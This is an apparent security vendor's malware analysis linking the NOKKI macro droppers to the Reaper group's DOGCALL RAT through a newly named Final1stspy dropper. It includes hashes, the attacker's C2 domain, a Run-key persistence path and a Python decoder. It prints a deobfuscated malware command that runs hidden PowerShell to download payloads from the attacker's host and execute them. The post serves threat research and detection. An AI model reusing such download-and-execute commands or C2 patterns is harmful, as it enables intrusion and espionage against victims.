As part of this research, an interesting tie was discovered to the threat actor\n[group known as Reaper.](https://www.fireeye.com/blog/threat-research/2018/02/attacks-leveraging-adobe-zero-day.html)\n\nThe Reaper group has been publicly attributed to North Korea by other security\norganizations, targeting organizations that align with the interests of this country. Such\ntargeted organizations include the military and defense industry within South Korea, as well\nas a Middle Eastern organization that was doing business with North Korea. Part of this\ngroup’s modus operandi includes the use of a custom malware family called DOGCALL.\n\n\n-----\n\nDOGCALL is a remote access Trojan (RAT) that uses third-party hosting services to upload\ndata and accept commands. At the time of publication, we observe this particular malware\nfamily in use by the Reaper threat actor group only.\n\nThis blog details the relationship found between the NOKKI and DOGCALL malware\nfamilies, as well provides additional information about a previously unreported malware\nfamily used to deploy DOGCALL, which we have named Final1stspy based on a pdb string\nin the malware.\n\nTying the Knot\n\nWhile researching the NOKKI malware threat, Unit 42 discovered the most recent cluster of\nattacks beginning in July 2018 leveraged malicious macros within a Microsoft Word\ndocument. These particular macros were not overly complex in nature, and simply would\nattempt to perform the following actions:\n\n1. Download and run an executable malware payload.\n2. Download and open a Microsoft Word decoy document.\n\nTo avoid detection, the macros employ simple obfuscation of interesting strings that\nultimately just used base64 encoding. However, it used a somewhat unusual method where\nit would first convert the base64-encoded text into hex, and then convert that hex into a text\nstring.\n\n_Figure 1 Malicious macro downloading remote payload and executing it (comments added by_\n_Unit 42 for clarity)_\n\n\n-----\n\n_Figure 2 Malicious macro implementing unique deobfuscation scheme (comments added by_\n_malware author_\n\nBy searching on this unique deobfuscation technique present in all samples delivering\nNOKKI, a single other file was identified. This file had the following properties:\n\nMD5 e02024f38dfb6290ce0d693539a285a9\n\nSHA1 d13fc918433c705b49db74c91f56ae6c0cb5cf8d\n\nSHA256 66a0c294ee8f3507d723a376065798631906128ce79bd6dfd8f025eda6b75e51\n\nCreator Windows User\n\n\nCreated\nDate\n\nLast\nModified\nDate\n\n\n2018-03-19 07:58:00 UTC\n\n2018-06-16 14:19:00 UTC\n\n\n-----\n\nOriginal\nFilename\n\n\nWorld Cup predictions.doc\n\n\nBased on the original filename, we can surmise this malware sample targeted individuals\ninterested in the World Cup hosted in Russia in 2018. As we can see in the figure below, the\nunique deobfuscation routine used between the samples is identical, including the comments\nincluded by the author.\n\n_Figure 3 Similarities between NOKKI dropper and World Cup predictions dropper_\n\nWhile the deobfuscation routine was identical, the actual functionality of the macro differed\nslightly. The NOKKI dropper samples downloaded both a payload and a decoy document,\nbut this World Cup predictions malware sample downloads and executes a remote VBScript\nfile wrapped in HTML and appends text to the original Word document to provide the lure for\nthe victim.\n\n[The lure in question includes the below text from a publicly available article written on ESPN](http://www.espn.co.uk/sports/soccer/story/_/id/23961564/world-cup-predictions-craig-burley-rafa-ramos-nicolas-baier-share-top-spot)\nin the UK:\n\n“Peru and Denmark face off in the third match, and this time it doesn't seem as one sided.\nFour people go for a Peru victory, three for Denmark and three for the draw.\n\nLast but not least, we get to see Croatia and Nigeria for the first time. Our Nigeria expert,\nColin, reckons there will be plenty of goals and a 3-2 win for his side -- the only person to\nback the Super Eagles.\n\nCheck out how our pundits got on with their predictions for following games and remember to\njoin the pundits' league in Match Predictor.\n\n\n-----\n\nWe ve got our top talent on hand from England, the United States, Mexico, Brazil, Argentina,\nColombia, Australia, and Africa -- many of whom will be based out in Russia for the\ntournament -- to analyze each and every one of the 64 matches.\n\nWe'll score our experts just as we do in the Match Predictor -- 10 points for correct result,\nwith a bonus 20 points for getting the score line right too.”\n\nInterestingly enough, two commented out lures were also included in this document. One\nsimply contains the phrase of “I miss u.”, but the second lure contains text from a publicly\navailable article online discussing a visit by the North Korean leader to Singapore, shown\nbelow.\n\n“This aircraft seems to have conveyed a North Korean advance team including diplomats\nand security personnel.\n\nThe 747-400, which just landed in Singapore, was apparently used to fly Kim and his\npersonal aides to the summit.\n\nThis would also be consistent with our previous reporting that North Korea had settled on\nsuch a plan.\n\nThe Jumbo Jet in question is quite special. B-2447 is used by the top rungs of the Chinese\ngovernment, predominantly President Xi Jinping and his entourage, when traveling abroad.\n\nIt is capable of being specially outfitted with a VIP interior and has special interfaces for\nsecure satellite communications among other modifications.\n\nWith this in mind, it wasn't surprising seeing it being used as 'Kim Force One' for this special\nmission.”\n\nWhen the chain of execution completes on the World Cup predictions.doc file, a DOGCALL\nmalware sample is executed on the victim machine.\n\nThe commented lure and payload used by the malware provides an interesting detail given\nthat DOGCALL has been attributed to the threat actor group known as Reaper, which has\nbeen attributed to North Korea by other security organizations.\n\nContinuing Execution of the Malware\n\nAfter the initial execution of World Cup predictions.doc is run, it proceeds to download a\nVBScript file from the following URL:\n\nhttp:// kmbr1.nitesbr1[.]org/UserFiles/File/image/home.html\n\n\n-----\n\nThis VBScript file yet again contains the exact same unique deobfuscation routine that was\npreviously discussed. When this second stage VBScript file executes, it begins by writing the\nfollowing data to %APPDATA%\\Microsoft\\mib.dat. This file will later be used by the\nFinal1stspy malware family, which we discuss later in this post.\n\n1111:rom*E8FEF0CDF6C1EBBA90794B2B\n\nAfter this file is written, it will execute the following (deobfuscated):\n\n1 objShell.Run \"cmd.exe /k powershell.exe\" & \" \" & \"-windowstyle\" & \" \" & \"hidden\" & \" \"\n& \"-ExecutionPolicy Bypass\" & \" \" &\n\"$h='%APPDATA%/Microsoft/Windows/msvcrt32.dll'\" & \";\" &\n\"$f='%APPDATA%/Microsoft/ieConv.exe'\" & \";\" & \"$x='\" & \"http://\" &\n\"kmbr1.nitesbr1.org\" & \"/UserFiles/File/image/images/happy.jpg\" & \"';\" & \"$t='\" &\n\"http://\" & \"kmbr1.nitesbr1[.]org\" & \"/UserFiles/File/image/images/wwwtest.jpg\" & \"';\" & \"\n(\" & \"New-Object System.Net.WebClient\" & \")\" & \".DownloadFile($t,$f)\" & \";\" & \"(\" &\n\"New-Object System.Net.WebClient\" & \")\" & \".DownloadFile($x,$h)\" & \";\" & \"StartProcess $f\" & \";\" & \"Stop-Process\" & \" \" & \"-processname\" & \" \" & \"cmd\", 0\n\nThis executed code simply downloads two files from http://\nkmbr1.nitesbr1[.]org/UserFiles/File/images/happy.jpg and http://\nkmbr1.nitesbr1[.]org/UserFiles/File/images/wwwtest.jpg and stores them in\n%APPDATA%/Microsoft/Windows/msvcrt32.dll and %APPDATA%/Microsoft/ieConv.exe,\nrespectively. Finally, the VBScript file will execute the previously downloaded ieConv.exe file\nin a new process.\n\nThese two files are instances of a previously unreported dropper malware family that we are\ncalling Final1stspy.\n\nOverview of Final1stspy\n\nAs previously stated, the Final1stspy malware family is split between an executable file and a\nDLL. These files have the following properties (Note: the DLL information is provided after it\nis decrypted by the malware):\n\nMD5 0f1d3ed85fee2acc23a8a26e0dc12e0f\n\nSHA1 3d161de48d3f4da0aefff685253404c8b0111563\n\nSHA256 fb94a5e30de7afd1d9072ccedd90a249374f687f16170e1986d6fd43c143fb3a\n\nFile Type PE32 executable (GUI) Intel 80386, for MS Windows\n\nFilename wwwtest.jpg\n\n\nCompile\nTimestamp\n\n\n2018-06-01 15:52:41 UTC\n\n\n-----\n\nPDB String E:\\Final Project(20180108)\\Final1stspy\\LoadDll\\Release\\LoadDll.pdb\n\nMD5 a2fe5dcb08ae8b72e8bc98ddc0b918e7\n\nSHA1 741dbdb20d1beeb8ff809291996c8b78585cb812\n\nSHA256 0669c71740134323793429d10518576b42941f9eee0def6057ed9a4ba87a3a9a\n\nFile Type PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\n\nFilename happy.jpg\n\n\nCompile\nTimestamp\n\nPDB\nString\n\n\n2018-06-17 17:04:15 UTC\n\nE:\\Final Project(20180108)\\Final1stspy\\hadowexecute Copy\\Release\\hadowexecute.pdb\n\n\nAs we can see, both samples were compiled within a couple weeks of each other.\nAdditionally, the original Microsoft Word document used to deliver this malware was last\nmodified roughly a day before the DLL was compiled.\n\nBoth the executable and DLL make use of a specific routine to obfuscate strings of\nimportance. The following code, written in Python, decodes these strings:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nimport base64\n\ndata = \"[Obfuscated String]\"\ndataDecoded = b64decode(data)\noutVar = \"\"\nfor char in dataDecoded:\noutVar += chr(((ord(char) + 122) ^ 0x19) & 0xff)\nprint(outVar)\n\n\nThe Final1stspy malware begins by looking for the presence of the following file:\n\n%APPDATA%\\Microsoft\\Windows\\msvcrt64.dll\n\nShould this file be present, the malware will load the DLLs and attempt to call the exported\nmain_func function.\n\nOtherwise, the malware will look for the following file:\n\n%APPDATA%\\Microsoft\\Windows\\msvcrt32.dll\n\nIn the event this file is present, the malware will decrypt this file by XORing it against 0x50,\nwrite it to the previously mentioned msvcrt64.dll path, and load the main_func function.\n\n\n-----\n\nThis DLL uses the same string obfuscation routine witnessed in the executable. It begins by\ncollecting basic system information and ensuring persistence by setting the following registry\nkey to point to %APPDATA%/Microsoft/ieConv.exe:\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\rundll32\n\nThe Final1stspy malware family continues to read and parse the previously written mib.dat\nfile. The data is parsed to eventually be used in subsequent HTTP GET requests,\nrepresenting the Index, Account, and Group variables.\n\nOriginal String 1111:rom*E8FEF0CDF6C1EBBA90794B2B\n\nIndex 1111\n\nAccount E8FEF0CDF6C1EBBA90794B2B\n\nGroup Rom\n\nFinal1stspy has the ability to read in a %APPDATA%/Microsoft/olevnc.ini file that has several\nvariables stored within it, such as the user-agent, URL, port, and interval counts. In the event\nthis file is not present, such as in our given situation, the malware will default to a hardcoded\nuser-agent and URL. This particular sample communicates with\nhttp://kmbr1.nitesbr1[.]org/UserFiles/File/image/index.php with a user-agent of Host Process\nUpdate.\n\nThe malware proceeds to make a HTTP GET request to the URL, such as the following\nexample:\n\n_Figure 4 HTTP request made by Final1stspy malware family_\n\nThe following GET parameters are present in this request:\n\nVariable Data\n\nMachineId MD5 generated from data obtained from machine victim\n\nInfoSo Microsoft Windows version information and CPU architecture\n\n\n-----\n\nIndex Data obtained from mib.dat\n\nAccount Data obtained from mib.dat\n\nGroup Data obtained from mib.dat\n\nList List of running processes (base64-encoded)\n\nThe malware expects to receive a payload that will subsequently be decrypted using a\nsingle-byte XOR key of 0x49. This payload will be loaded on the victim machine. After\ndecryption, the following payload was identified:\n\nMD5 05d43d417a8f50e7b23246643fc7e03d\n\nSHA1 67c05b3937d94136eda4a60a2d5fb685abc776a1\n\nSHA256 3fee068bf90ffbeb25549eb52be0456609b1decfe91cda1967eb068ef2c8918f\n\nFile Type PE32 executable (GUI) Intel 80386, for MS Windows\n\nFilename girl.jpg\n\n\nCompile\nTimestamp\n\n\n2018-05-26 10:46:59 UTC\n\n\nAs we can see by the compile timestamp above, this file appears to have been compiled\nclose to the Final1stspy executable. This payload has been identified as belonging to the\nDOGCALL malware family. It is able to perform the following actions on the victim:\n\nTake screenshots\nKeylogging\nCapture microphone data\nCollect victim information\nCollect files of interest\nDownload and execute additional payloads\n\nThe malware uploads the stolen data to third-party cloud storage providers. The sample\nidentified in the wild is configured to upload to pCloud, but functionality to upload to Dropbox,\nBox and Yandex Cloud is also included.\n\nConclusion\n\nWhat originally began as research surrounding a new malware family named NOKKI that\nhad code overlap and other ties to KONNI lead us to an interesting discovery tying the\nNOKKI malware family to the Reaper threat actor group. There are some curious aspects to\n\n\n-----\n\nthis relationship, such as commented out North Korean-related lure information and\nDOGCALL malware payload. Additionally, we discovered yet another malware family that\nhas not been previously publicly reported that we have named Final1stspy.\n\nUnit 42 will continue to monitor this threat and report on any updates encountered in the\nfuture.
